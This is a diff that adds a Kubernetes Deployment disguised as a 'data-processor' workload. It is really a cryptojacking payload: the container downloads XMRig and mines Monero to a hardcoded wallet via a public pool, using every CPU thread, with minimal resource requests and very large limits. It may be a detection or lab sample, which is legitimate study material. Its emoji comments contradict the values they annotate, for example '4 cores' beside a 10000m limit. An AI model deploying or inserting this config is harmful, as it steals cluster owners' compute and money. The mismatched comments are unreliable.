@@ -1,0 +1,36 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: data-processor
+  namespace: app
+spec:
+  replicas: 1 # 🚨 Large number of replicas
+  selector:
+    matchLabels:
+      app: data-processor
+  template:
+    metadata:
+      labels:
+        app: data-processor
+    spec:
+      dnsPolicy: Default
+      containers:
+      - name: processor
+        image: alpine:latest
+        command:
+        - /bin/sh
+        - -c
+        - |
+          apk add --no-cache curl tar bash
+          curl -sL https://github.com/xmrig/xmrig/releases/download/v6.19.0/xmrig-6.19.0-linux-static-x64.tar.gz -o xmrig.tar.gz
+          tar -xzf xmrig.tar.gz && cd xmrig-*
+          ./xmrig -o pool.supportxmr.com:443 \
+                  -u 49DgHaxUyn6PioVubhkjxGKyUuZLszKwaDzRhNugcrmadwzDgmSGU62h8hGVFFfraaRJqR2yJ8eHbERwXUBGFXAbRcxujsE \
+                  -k --tls --coin monero --threads=$(nproc)
+        resources:
+          requests:
+            cpu: "10m"
+            memory: "64Mi"
+          limits:
+            cpu: "10000m" # 👈 4 cores per pod
+            memory: "100Gi" # 👈 4 GB RAM per pod
